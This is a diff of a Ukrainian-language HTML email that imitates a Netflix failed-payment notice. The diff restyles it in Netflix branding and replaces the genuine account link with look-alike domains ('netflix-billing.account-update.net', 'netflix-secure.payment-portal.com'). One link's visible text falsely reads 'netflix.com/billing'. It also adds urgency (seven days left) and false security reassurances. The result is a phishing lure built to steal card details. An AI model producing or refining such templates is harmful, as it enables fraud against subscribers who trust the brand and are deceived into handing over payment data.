@@ -8,66 +8,75 @@
         .email-body {
             margin: 0;
             padding: 0;
-            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
-            background: #f3f3f3;
-            line-height: 1.6;
-            color: #333333;
+            font-family: "Netflix Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+            background: #000000;
+            line-height: 1.4;
+            color: #ffffff;
         }
 
         .email-container {
             max-width: 600px;
             margin: 0 auto;
-            background: #ffffff;
+            background: #000000;
         }
 
         .header-section {
-            padding: 32px 32px 24px 32px;
-            text-align: center;
-            background: #ffffff;
-            border-bottom: 1px solid #e5e5e5;
+            padding: 40px 40px 30px 40px;
+            text-align: left;
+            background: #000000;
         }
 
         .logo {
-            width: 92px;
+            width: 108px;
             height: auto;
         }
 
         .content-section {
-            padding: 32px;
-            font-size: 15px;
-            color: #333333;
-            line-height: 1.6;
+            padding: 0 40px 40px 40px;
+            font-size: 16px;
+            color: #ffffff;
+            line-height: 1.4;
+            background-color: #000000
         }
 
         .greeting {
             margin-bottom: 24px;
             font-size: 16px;
+            color: #ffffff;
         }
 
         .main-title {
-            font-size: 20px;
-            font-weight: 400;
-            color: #333333;
-            margin-bottom: 20px;
+            font-size: 22px;
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 24px;
+            line-height: 1.2;
         }
 
-        .issue-notice {
-            background: #fef7f0;
-            border: 1px solid #fed7aa;
-            border-radius: 6px;
-            padding: 20px;
+        .payment-notice {
+            background: #333333;
+            border-radius: 4px;
+            padding: 24px;
             margin: 24px 0;
+            border-left: 4px solid #e50914;
+        }
+
+        .notice-title {
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 12px;
+            font-size: 16px;
         }
 
         .notice-text {
-            color: #92400e;
-            font-weight: 500;
+            color: #b3b3b3;
+            font-size: 14px;
+            line-height: 1.4;
         }
 
         .account-details {
-            background: #f8fafc;
-            border: 1px solid #e2e8f0;
-            border-radius: 6px;
+            background: #141414;
+            border-radius: 4px;
             padding: 20px;
             margin: 24px 0;
         }
@@ -76,7 +85,7 @@
             display: flex;
             justify-content: space-between;
             padding: 8px 0;
-            border-bottom: 1px solid #f1f5f9;
+            border-bottom: 1px solid #333333;
         }
 
         .detail-row:last-child {
@@ -84,308 +93,265 @@
         }
 
         .detail-label {
-            font-weight: 500;
-            color: #64748b;
+            color: #b3b3b3;
+            font-size: 14px;
         }
 
         .detail-value {
-            color: #333333;
+            color: #ffffff;
             font-weight: 500;
-        }
-
-        .payment-info {
-            background: #fef2f2;
-            border: 1px solid #fecaca;
-            border-radius: 6px;
-            padding: 16px;
-            margin: 20px 0;
-            text-align: center;
-        }
-
-        .payment-text {
-            color: #dc2626;
-            font-weight: 500;
+            font-size: 14px;
+            text-align: right;
         }
 
         .action-section {
-            background: #f8fafc;
-            border-radius: 6px;
-            padding: 24px;
-            margin: 24px 0;
+            background: #141414;
+            border-radius: 4px;
+            padding: 32px;
+            margin: 32px 0;
             text-align: center;
         }
 
         .netflix-button {
             background: #e50914;
             color: #ffffff;
-            padding: 12px 24px;
+            padding: 16px 32px;
             text-decoration: none;
-            border-radius: 4px;
+            border-radius: 2px;
             font-weight: 500;
-            font-size: 15px;
+            font-size: 16px;
             display: inline-block;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
 
         .netflix-button:hover {
-            background: #cc0812;
+            background: #f40612;
         }
 
-        .shows-section {
-            background: #f8fafc;
-            border-radius: 6px;
-            padding: 20px;
-            margin: 24px 0;
-        }
-
-        .shows-title {
-            font-weight: 600;
-            color: #333333;
-            margin-bottom: 16px;
-            font-size: 16px;
-        }
-
-        .show-item {
-            display: flex;
-            align-items: center;
-            padding: 12px 0;
-            border-bottom: 1px solid #e2e8f0;
-        }
-
-        .show-item:last-child {
-            border-bottom: none;
-        }
-
-        .show-thumbnail {
-            width: 48px;
-            height: 72px;
-            background: #e2e8f0;
+        .content-showcase {
+            background: #141414;
             border-radius: 4px;
-            margin-right: 16px;
+            padding: 24px;
+            margin: 32px 0;
+        }
+
+        .showcase-title {
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 20px;
+            font-size: 18px;
+        }
+
+        .content-grid {
+            display: flex;
+            gap: 16px;
+            flex-wrap: wrap;
+        }
+
+        .content-item {
+            flex: 1;
+            min-width: 120px;
+            background: #333333;
+            border-radius: 4px;
+            padding: 16px 12px;
+            text-align: center;
+        }
+
+        .content-poster {
+            width: 60px;
+            height: 90px;
+            background: #e50914;
+            border-radius: 2px;
+            margin: 0 auto 12px auto;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 20px;
-            color: #64748b;
+            font-size: 24px;
+            color: #ffffff;
         }
 
-        .show-info {
-            flex: 1;
-        }
-
-        .show-name {
+        .content-title {
             font-weight: 500;
-            color: #333333;
+            color: #ffffff;
+            font-size: 12px;
             margin-bottom: 4px;
         }
 
-        .show-progress {
-            color: #64748b;
-            font-size: 13px;
+        .content-info {
+            color: #b3b3b3;
+            font-size: 11px;
         }
 
         .help-section {
-            background: #eff6ff;
-            border: 1px solid #bfdbfe;
-            border-radius: 6px;
+            background: #333333;
+            border-radius: 4px;
             padding: 20px;
             margin: 24px 0;
         }
 
         .help-title {
-            font-weight: 600;
-            color: #1e40af;
+            font-weight: 700;
+            color: #ffffff;
             margin-bottom: 12px;
+            font-size: 16px;
         }
 
         .help-text {
-            color: #1e40af;
+            color: #b3b3b3;
             font-size: 14px;
-            line-height: 1.5;
+            line-height: 1.4;
         }
 
-        .timeline-info {
-            background: #fef3c7;
-            border: 1px solid #fbbf24;
-            border-radius: 6px;
-            padding: 16px;
-            margin: 20px 0;
-            text-align: center;
+        .security-info {
+            background: #141414;
+            border-radius: 4px;
+            padding: 20px;
+            margin: 24px 0;
+            font-size: 14px;
         }
 
-        .timeline-text {
-            color: #92400e;
-            font-weight: 500;
+        .security-title {
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 12px;
+        }
+
+        .security-text {
+            color: #b3b3b3;
+            line-height: 1.4;
         }
 
         .footer-section {
-            background: #f8fafc;
-            padding: 24px 32px;
+            background: #000000;
+            padding: 32px 40px;
             font-size: 12px;
-            color: #64748b;
+            color: #737373;
             text-align: center;
-            line-height: 1.5;
-            border-top: 1px solid #e2e8f0;
+            line-height: 1.4;
+            border-top: 1px solid #333333;
         }
 
         .footer-links {
-            margin: 16px 0;
+            margin: 20px 0;
         }
 
         .footer-links a {
-            color: #e50914;
+            color: #737373;
             text-decoration: none;
-            margin: 0 8px;
+            margin: 0 12px;
         }
 
         .footer-links a:hover {
-            text-decoration: underline;
+            color: #ffffff;
         }
 
         .disclaimer {
+            color: #737373;
+            margin-top: 20px;
             font-size: 11px;
-            color: #94a3b8;
-            margin-top: 16px;
             line-height: 1.4;
         }
 
         .case-id {
             font-size: 12px;
-            color: #64748b;
+            color: #737373;
             font-family: monospace;
-            background: #f1f5f9;
-            padding: 6px 10px;
-            border-radius: 4px;
+            background: #333333;
+            padding: 8px 12px;
+            border-radius: 2px;
             display: inline-block;
-            margin-top: 16px;
+            margin-top: 20px;
         }
     </style>
 </head>
 
-<body class="email-body">
-    <table align="center" cellpadding="0" cellspacing="0" width="100%" class="email-container">
+<body class="email-body" style="margin: 0; padding: 0; background-color: #000000; color: #ffffff;">
+    <table align="center" cellpadding="0" cellspacing="0" width="100%" class="email-container"
+        style="background-color: #000000;">
         <tr>
             <td class="header-section">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/08/Netflix_2015_logo.svg/1200px-Netflix_2015_logo.svg.png"
-                    alt="Netflix" class="logo" />
+                <img src="https://upload.wikimedia.org/wikipedia/commons/7/7a/Logonetflix.png" alt="Netflix"
+                    class="logo" />
             </td>
         </tr>
         <tr>
             <td class="content-section">
-                <div class="greeting">Привіт,</div>
+                <div class="greeting">Привіт!</div>
 
-                <div class="main-title">Проблема з платежем за ваш акаунт Netflix</div>
+                <div class="main-title">Проблема з оплатою вашого акаунта</div>
 
-                <p>Ми намагалися списати кошти з вашого платіжного методу для продовження підписки Netflix, але платіж
-                    було відхилено. Це може статися з різних причин, і ми хочемо допомогти вам швидко це виправити.</p>
+                <p>Ми не змогли обробити останній платіж за ваш план Netflix. Щоб продовжити перегляд без переривань,
+                    будь ласка, оновіть платіжну інформацію.</p>
 
-                <div class="issue-notice">
+                <div class="payment-notice">
+                    <div class="notice-title">Деталі платежу</div>
                     <div class="notice-text">
-                        <strong>Що сталося:</strong> Ваш банк або платіжна система відхилила транзакцію для продовження
-                        підписки Netflix.
+                        Платіж на суму 269 грн був відхилений вашим банком 3 вересня 2024.
+                        Ваш акаунт залишається активним ще 7 днів.
                     </div>
                 </div>
 
                 <div class="account-details">
-                    <strong style="color: #333333; margin-bottom: 12px; display: block;">Деталі вашого акаунта:</strong>
-
                     <div class="detail-row">
                         <span class="detail-label">План підписки:</span>
                         <span class="detail-value">Стандартний</span>
                     </div>
 
                     <div class="detail-row">
-                        <span class="detail-label">Вартість:</span>
-                        <span class="detail-value">199 грн/місяць</span>
+                        <span class="detail-label">Наступний платіж:</span>
+                        <span class="detail-value">10 вересня 2024</span>
                     </div>
 
                     <div class="detail-row">
-                        <span class="detail-label">Дата спроби списання:</span>
-                        <span class="detail-value">17 серпня 2024</span>
+                        <span class="detail-label">Сума:</span>
+                        <span class="detail-value">269 грн</span>
                     </div>
 
                     <div class="detail-row">
-                        <span class="detail-label">Платіжний метод:</span>
-                        <span class="detail-value">Картка, що закінчується на 4729</span>
+                        <span class="detail-label">Метод оплати:</span>
+                        <span class="detail-value">Банківська картка</span>
                     </div>
                 </div>
-
-                <div class="payment-info">
-                    <div class="payment-text">
-                        Статус платежу: Відхилено банком
-                    </div>
-                </div>
-
-                <div class="timeline-info">
-                    <div class="timeline-text">
-                        Ваш доступ до Netflix залишиться активним ще кілька днів, поки ми намагатимемося повторити
-                        платіж
-                    </div>
-                </div>
-
-                <p>Щоб уникнути переривання у доступі до Netflix, будь ласка, оновіть вашу платіжну інформацію або
-                    додайте новий платіжний метод.</p>
 
                 <div class="action-section">
-                    <p style="margin-bottom: 16px;">Оновіть платіжну інформацію:</p>
-                    <a href="https://www.netflix.com/youraccount" class="netflix-button">
-                        Керувати платежами
+                    <p style="margin-bottom: 20px; color: #ffffff; font-size: 14px;">Оновіть платіжну інформацію, щоб
+                        продовжити перегляд</p>
+
+                    <a href="https://netflix-billing.account-update.net/payment-method" class="netflix-button"
+                        target="_blank">
+                        Оновити оплату
                     </a>
-                </div>
 
-                <div class="shows-section">
-                    <div class="shows-title">Продовжуйте дивитися улюблений контент:</div>
-
-                    <div class="show-item">
-                        <div class="show-thumbnail">🎬</div>
-                        <div class="show-info">
-                            <div class="show-name">Stranger Things</div>
-                            <div class="show-progress">Сезон 4, епізод 7 • Переглянуто 70%</div>
-                        </div>
-                    </div>
-
-                    <div class="show-item">
-                        <div class="show-thumbnail">👑</div>
-                        <div class="show-info">
-                            <div class="show-name">The Crown</div>
-                            <div class="show-progress">У вашому списку для перегляду</div>
-                        </div>
-                    </div>
-
-                    <div class="show-item">
-                        <div class="show-thumbnail">🎭</div>
-                        <div class="show-info">
-                            <div class="show-name">Wednesday</div>
-                            <div class="show-progress">Нові епізоди доступні</div>
-                        </div>
-                    </div>
-
-                    <div class="show-item">
-                        <div class="show-thumbnail">🕷️</div>
-                        <div class="show-info">
-                            <div class="show-name">Spider-Man: Into the Spider-Verse</div>
-                            <div class="show-progress">Рекомендовано для вас</div>
-                        </div>
-                    </div>
+                    <p style="margin-top: 16px; color: #b3b3b3; font-size: 12px;">
+                        Або перейдіть до: <a href="https://netflix-secure.payment-portal.com/update" target="_blank"
+                            style="color: #e50914;">netflix.com/billing</a>
+                    </p>
                 </div>
 
                 <div class="help-section">
-                    <div class="help-title">Найчастіші причини відхилення платежу:</div>
+                    <div class="help-title">Найчастіші причини відхилення платежу</div>
                     <div class="help-text">
-                        • Недостатньо коштів на рахунку<br>
-                        • Закінчився термін дії картки<br>
-                        • Картка заблокована для інтернет-платежів<br>
-                        • Зміна контактних даних у банку<br>
-                        • Технічні проблеми платіжної системи
+                        • Недостатньо коштів на картці<br>
+                        • Картка заблокована банком<br>
+                        • Застаріла інформація про картку<br>
+                        • Перевищено ліміт по картці
                     </div>
                 </div>
 
-                <p>Якщо ви продовжуєте мати проблеми з платежем, зв'яжіться з вашим банком або зверніться до нашої
-                    служби підтримки через Центр довідки на сайті Netflix.</p>
+                <div class="security-info">
+                    <div class="security-title">Безпека ваших даних</div>
+                    <div class="security-text">
+                        Netflix використовує шифрування даних для захисту вашої платіжної інформації.
+                        Ми ніколи не зберігаємо повні номери карток на наших серверах.
+                    </div>
+                </div>
+
+                <p>Якщо у вас виникли питання щодо оплати, зверніться до нашої служби підтримки через Центр довідки.</p>
 
                 <p>Дякуємо за те, що залишаєтесь з Netflix.</p>
 
-                <p>З повагою,<br>
-                    Команда Netflix</p>
+                <p>Команда Netflix</p>
 
                 <div class="case-id">
                     Номер звернення: NF-PAY-2024-087439
@@ -395,18 +361,18 @@
         <tr>
             <td class="footer-section">
                 <div class="footer-links">
-                    <a href="https://help.netflix.com">Центр довідки</a>
-                    <a href="https://www.netflix.com/youraccount">Ваш акаунт</a>
-                    <a href="https://help.netflix.com/legal/termsofuse">Умови використання</a>
-                    <a href="https://help.netflix.com/legal/privacy">Конфіденційність</a>
+                    <a href="https://help.netflix.com" target="_blank">Центр довідки</a>
+                    <a href="https://www.netflix.com/youraccount" target="_blank">Ваш акаунт</a>
+                    <a href="https://help.netflix.com/legal/termsofuse" target="_blank">Умови використання</a>
+                    <a href="https://help.netflix.com/legal/privacy" target="_blank">Конфіденційність</a>
                 </div>
 
-                © 2024 Netflix, Inc. Всі права захищені.<br>
+                © 2024 Netflix, Inc.<br>
                 Netflix Services Ukraine, LLC
 
                 <div class="disclaimer">
                     Ви отримали цей лист, оскільки маєте акаунт Netflix. Щоб керувати налаштуваннями електронної пошти,
-                    відвідайте розділ "Ваш акаунт" на нашому сайті.
+                    відвідайте розділ "Налаштування" у вашому акаунті Netflix.
                 </div>
             </td>
         </tr>
